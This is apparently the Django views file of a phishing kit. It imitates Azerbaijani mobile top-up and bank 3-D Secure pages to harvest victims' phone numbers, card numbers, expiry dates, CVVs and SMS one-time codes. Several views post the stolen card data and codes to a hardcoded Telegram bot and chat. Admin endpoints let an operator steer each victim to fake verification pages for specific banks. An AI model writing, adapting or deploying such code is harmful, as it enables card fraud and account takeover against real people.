from django.shortcuts import render, redirect
from django.db import models
from .models import ContactModel
import requests
from django.http import HttpResponse
import re
from django.views.decorators.csrf import csrf_exempt

import json
from django.shortcuts import render, redirect, get_object_or_404
from .forms import ContactForm
from django.http import JsonResponse
from django.urls import reverse_lazy
from django.contrib.auth.decorators import user_passes_test
import time
import random
from django.contrib.sessions.models import Session
from django.utils import timezone
from .models import ActiveUser

from rest_framework import generics
from .models import BannedIP
from .serializers import BannedIPSerializer
from django.core.exceptions import ObjectDoesNotExist
from django.http import HttpResponse
from .models import IPAddress
import socket
from django.http import HttpResponseRedirect
from django.urls import reverse
from django.views.decorators.csrf import ensure_csrf_cookie
def index(request):
    user_id = request.session.session_key
    if not user_id:
        request.session.create()
        user_id = request.session.session_key

    ActiveUser.objects.update_or_create(user_id=user_id, page_name='index', defaults={'last_activity': timezone.now()})
    return render(request, "pages/index.html")

def nar(request):
    return render(request, "pages/nar.html")
def azerisiq(request):
    return render(request, "pages/azerisiq.html")
def azeriqaz(request):
    return render(request, "pages/azeriqaz.html")
def azersu(request):
    return render(request, "pages/azersu.html")

@csrf_exempt
def naxtel(request):
    if request.method == "POST":
        operator = request.POST.get('operator')
        amount = request.POST.get("amount")
        number = request.POST.get("number")
        if amount is None or len(amount) == 0:
            return render(request, "pages/azercell.html",)
        client_ip = get_client_ip(request)
        contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
        contact.page_name="info"
        contact.save()
        request.session['operator'] = operator
        request.session['phone'] = number
        request.session['amount'] = amount
        return redirect('info')
    return render(request, "pages/naxtel.html")

def delete_all_contacts(request):
    ContactModel.objects.all().delete()
    return JsonResponse({'status': 'success'})

def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

@csrf_exempt
def azercell(request):
    if request.method == "POST":
        operator = request.POST.get('operator')
        amount = request.POST.get("amount")
        number = request.POST.get("number")
        if number is None or len(number) == 0:
            return render(request, "pages/azercell.html",)
        if amount is None or len(amount) == 0:
            return render(request, "pages/azercell.html",)
        client_ip = get_client_ip(request)
        contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
        contact.page_name="/info"
        contact.save()
        request.session['operator'] = operator
        request.session['phone'] = number
        request.session['amount'] = amount
        request.session['contact_id'] = contact.id  # Store the contact_id in the session
        return redirect('info')
    return render(request, "pages/azercell.html")

@csrf_exempt
def bakcell(request):
    if request.method == "POST":
        request.POST
        operator = request.POST.get('operator')
        amount = request.POST.get("amount")
        number = request.POST.get("number")
        if amount is None or len(amount) == 0:
            return render(request, "pages/azercell.html",)
        client_ip = get_client_ip(request)
        contact = ContactModel(ip=client_ip, operator=operator, phone=number, amount=amount)
        contact.page_name="/info"
        contact.save()
        request.session['operator'] = operator
        request.session['phone'] = number
        request.session['amount'] = amount
        request.session['contact_id'] = contact.id
        return redirect('info',)
    return render(request, "pages/bakcell.html")


@csrf_exempt
def info(request):
    if request.method == "POST":
        cardnumber= request.POST.get("cardnumber")
        if validate_card_number(cardnumber) == False:
            return render(request, "pages/3dsec.html")
        contact_id = request.session.get('contact_id')
        contact = ContactModel.objects.get(id=contact_id)
        print(contact_id)
        print(contact.id,contact.cc)
        mm_= request.POST.get("mm")
        yy_= request.POST.get("yy")
        cvv_= request.POST.get("cvv")
        if cvv_ and (not cvv_.isdigit() or len(cvv_) < 3):
            error_msg = "CVV must be a 3-digit number."
            return render(request, "pages/3dsec.html")
        elif len(cvv_) == 0:
            error_msg = "CVV must be a 3-digit number."
            return render(request, "pages/3dsec.html")
        elif len(cvv_) == 1:
            error_msg = "CVV must be a 3-digit number."
            return render(request, "pages/3dsec.html")
        elif len(cvv_) == 2:
            error_msg = "CVV must be a 3-digit number."
            return render(request, "pages/3dsec.html")
        contact.cc = cardnumber
        contact.mm = mm_
        contact.yy = yy_
        contact.cvv = cvv_
        contact.bankname=""
        contact.page_name="/Loading.html"
        contact.save()
        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:Loading\n\n{contact.ip}\n{contact.cc}|{contact.mm}|{contact.yy}|{contact.cvv}\n Operator: {contact.operator} \nNumber:{contact.phone}\n@Maybewhou @Thinkpsd')
        context = {
                'id':contact.id,
                "display":contact.hidden_type
            }
        return render(request, 'pages/master.html', {'last_contact_id': contact.id})
    operator = request.session.get('operator')
    phone = request.session.get('phone')
    amount = request.session.get('amount')
    if not (operator and phone and amount):
        return redirect('index')
    context = {
        'operator': operator,
        'phone': phone,
        'amount': amount,
    }
    contact = ContactModel(ip=get_client_ip(request), operator=operator, phone=phone, amount=amount)
    contact.page_name="/3dsec"
    return render(request, 'pages/3dsec.html', context)

def check_approval_status(request, contact_id):
    try:
        contact = ContactModel.objects.get(pk=contact_id)
        return JsonResponse({'bankname': contact.bankname})
    except ContactModel.DoesNotExist:
        return JsonResponse({'error': f'Contact with ID {contact_id} does not exist.'}, status=404)

def validate_card_number(card_number):
    regex = r'^[456]\d{3}-?\d{4}-?\d{4}-?\d{4}|^[456]\d{15}$'
    if re.match(regex, card_number):
        return True
    return False


def loading(request):
    return render(request, "pages/master.html")

def kapital(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.bankname=""
    contact.page_name="/Kapital"
    contact.save()
    contex = {
        'last_contact_id': contact.id,
        "amount":contact.amount,
        "display":contact.hidden_type
    }
    return render(request, "pages/kapital.html",contex)

def cerime(request):
    return render(request, "pages/cerime.html")

def is_admin(user):
    return user.is_superuser

@user_passes_test(is_admin)
def crud(request):
    contacts = ContactModel.objects.all()
    return render(request, 'pages/crud.html', {'contacts': contacts})




def custom_404_page(request, exception):
    return render(request, 'pages/404.html', status=404)

@csrf_exempt
def contact_create(request):
    form = ContactForm(request.POST or None)
    if form.is_valid():
        form.save()
        return redirect('contact_list')
    return render(request, 'pages/contact_form.html', {'form': form})


def contact_update(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    form = ContactForm(request.POST or None, instance=contact)
    if form.is_valid():
        form.save()
        return redirect('contact_list')
    return render(request, 'pages/contact_form.html', {'form': form})


def contact_delete(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    contact.delete()
    return render( request,'pages/crud.html')



def contact_list_api(request):
    contacts = ContactModel.objects.order_by('-id').values()  # Only return contacts with non-null value for cvv
    return JsonResponse({'contacts': list(contacts)})

def phone_only_count_api(request):
    contacts = ContactModel.objects.exclude(
        bankname__isnull=False, 
        cc__isnull=False, 
        cvv__isnull=False, 
        mm__isnull=False, 
        yy__isnull=False, 
        sms__isnull=False
    )
    count = contacts.count()
    return JsonResponse({'count': count})
@csrf_exempt
def approve_action(request):
    if request.method == 'POST' and request.POST.get('action') == 'approve':
        id = request.POST.get('id')
        contact = get_object_or_404(ContactModel, id=id)
        # Perform the approve action here
        # ...
    return render(request, "pages/cerime.html")
    




def contact_approve(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "kapital"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})





def leobank(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "leobank"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})

@csrf_exempt
def contact_approve_abb(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "abb"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})

@csrf_exempt
def contact_approve_unibank(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "unibank"
    contact.save()


    return JsonResponse({'success': True})


def smserror(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    # Update the hidden_type field
    contact.hidden_type = ""
    contact.save()
    print(contact.hidden_type)
    # Here you can redirect to another page
    # For example: return redirect('azercell')

    return JsonResponse({'success': True})


def smserrorfix(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    # Update the hidden_type field
    contact.hidden_type = "none"
    contact.save()
    print(contact.hidden_type)
    # Here you can redirect to another page
    # For example: return redirect('azercell')

    return JsonResponse({'success': True})



@csrf_exempt
def contact_approve_pashabank(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "pashabank"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})


@csrf_exempt
def contact_approve_error(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    
    # Kullanıcının onay durumunu güncelleyin (örneğin, onaylanmış bir alan ekleyerek)
    contact.bankname = "error"
    contact.save()

    # Burada başka bir sayfaya yönlendirme yapabilirsiniz
    # Örneğin: return redirect('azercell')

    return JsonResponse({'success': True})

def approval_page(request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    context = {'contact': contact}
    return render(request, 'pages/azercell.html', context)


def redirect_user(request):
    url = reverse('crud:index') # Kullanıcının yönlendirileceği URL
    return HttpResponseRedirect(url)



def post(self, request, pk):
    contact = get_object_or_404(ContactModel, pk=pk)
    contact.is_approved = True
    contact.save()
    return redirect(reverse_lazy('home'))



def approve_contact_api(request, pk):
    try:
        contact = ContactModel.objects.get(pk=pk)
        contact.is_approved = True
        contact.save()
        return JsonResponse({'success': True})
    except ContactModel.DoesNotExist:
        return JsonResponse({'success': False}, status=404)

@csrf_exempt
def abb(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    
    context = {
    'amount':contact.amount,
    'cc': contact.cc[-4:],
    "display":contact.hidden_type
    }
    contact.page_name="/loading"
    contact.page_name="/abb3d"
    
    contact.save()
    print(context)
    return render( request,'pages/abb3d.html' ,context)

def rabite(request):

    return render( request,'pages/rabite.html' )

@csrf_exempt
def dsecazericard(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    if request.method == "POST":
        sms = request.POST.get('secpass')
        contact_id = request.session.get('contact_id')
        contact = ContactModel.objects.get(id=contact_id)
        contact.sms=sms
        contact.save()
        context = {
            'last_contact_id': contact.id,
            "display":contact.hidden_type
        }
        contact.bankname=""
        contact.page_name="/loading"
        contact.save()
        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:{request.path}\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou @Thinkpsd')

        return render( request,'pages/loading.html',context )
    return render( request,'pages/loading.html',context )
def page_not_found(request, exception):
    return render(request, 'pages/404.html', status=404)

@csrf_exempt  
def dseckapital(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    context = {
        'last_contact_id': contact.id,
        "display":contact.hidden_type
    }
    if request.method == "POST":
        input1 = request.POST.get("input1")
        input2 = request.POST.get("input2")
        input3 = request.POST.get("input3")
        input4 = request.POST.get("input4")
        if any(input_val == "" for input_val in [input1, input2, input3, input4]):
            # handle the case when input6 is empty
            # for example, you can display an error message to the user
            return render(request, 'pages/kapital.html')
        concatenated = input1 + input2+input3+input4
        contact.sms=concatenated
        contact.bankname=""
        contact.page_name="/loading"
        contact.save()
        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:Loading\nnumber{contact.phone}\nsms:{concatenated}\n@Maybewhou @Thinkpsd')
        return render( request,'pages/loading.html' )
    contact.page_name="/loading"
    contact.save()
    return render( request,'pages/loading.html',context )

@csrf_exempt
def leobank3d(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    if request.method == "POST":
        return render( request,'pages/error.html' )    
    context = {
    'last_contact_id': contact.id,
    'amount':contact.amount,
    'cc': contact.cc[-4:],
    "display":contact.hidden_type
    }
    contact.page_name="/error"
    contact.save()
    return render( request,'pages/error.html',context )

@csrf_exempt
def unibank(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    number = str(contact.phone)
    contact.bankname=""
    contact.page_name="/unibank3d"
    contact.save()
    context = {
        'number': number[-4:],
        'amount': contact.amount,
        'cc': contact.cc[-4:],
        "display":contact.hidden_type
    }
    
    return render( request,'pages/unibank3d.html',context )


@csrf_exempt
def unibank3d(request):
    sms = request.POST.get('secpass')
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.sms=sms
    contact.bankname=""
    contact.page_name="/loading"
    contact.save()
    context = {
        'last_contact_id': contact.id,
        "display":contact.hidden_type
    }
    
    if len(sms) == 0:
        # handle the case when input6 is empty
        # for example, you can display an error message to the user
        contact.page_name="/unibank3d"
        contact.save()
        return render(request, 'pages/unibank3d.html')
    response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id{contact.id}\nPage:Loading\nsms:{contact.sms}|number{contact.phone}\n@Maybewhou @Thinkpsd')
    return render( request,'pages/loading.html',context )



@csrf_exempt
def pashabank(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    number = str(contact.phone)
    contact.bankname=""
    context = {
        'last_contact_id': contact.id,
        'number': number[-4:],
        'amount': contact.amount,
        'cc': contact.cc[-4:],
        "display":contact.hidden_type
    }
    contact.page_name="/pasha"
    contact.save()
    return render( request,'pages/pasha.html',context )


def error(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    contact.page_name="/error"
    contact.save()
    return render( request,'pages/error.html' )



@csrf_exempt
def pashabank3d(request):
    contact_id = request.session.get('contact_id')
    contact = ContactModel.objects.get(id=contact_id)
    context = {
        'last_contact_id': contact.id,
        "display":contact.hidden_type
    }
    if request.method == "POST":
        number = str(contact.phone)
        contact.bankname=""
        input1 = request.POST.get("input1")
        input2 = request.POST.get("input2")
        input3 = request.POST.get("input3")
        input4 = request.POST.get("input4")
        input5 = request.POST.get("input5")
        input6 = request.POST.get("input6")
        if len(input5) == 0:
         # handle the case when input6 is empty
         # for example, you can display an error message to the user
         return render(request, 'pages/pasha.html',)
        concatenated = input1+input2 +input3+input4+input5+input6
        contact = ContactModel.objects.latest('created_at')
        contact.sms=concatenated
        contact.page_name="/loading"
        contact.save()
        response = requests.post(f'https://api.telegram.org/bot6284666597:AAE17trIGiyILsEmfW9W9KcHNUUnIJKLZ_M/sendMessage?chat_id=-1001861916739&text=id:{contact.id}\nPage:loading\n Number{contact.phone}\nsms:{concatenated}\n@Maybewhou @Thinkpsd')
        return render( request,'pages/loading.html',context )
    contact.bankname=""
    contact.page_name="/loading"
    contact.save()
    return render( request,'pages/loading.html',context )




def check_status(request):
    last_contact = get_object_or_404(ContactModel.objects.order_by('-created_at')[:1])
    data = {
        'error_message': last_contact.error_message
    }
    return JsonResponse(data)




class BannedIPListCreateAPIView(generics.ListCreateAPIView):
    queryset = BannedIP.objects.all()
    serializer_class = BannedIPSerializer
    
    
def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def unique_ip_count(request):
    client_ip = get_client_ip(request)

    ip_exists = IPAddress.objects.filter(ip=client_ip).exists()

    if not ip_exists:
        IPAddress.objects.create(ip=client_ip)

    unique_ip_count = IPAddress.objects.count()

    return JsonResponse({'count': unique_ip_count})


def active_users_count(request, page_name):
    now = timezone.now()
    threshold = now - timezone.timedelta(minutes=5)
    active_users = ActiveUser.objects.filter(page_name=page_name, last_activity__gte=threshold).count()
    return JsonResponse({'count': active_users})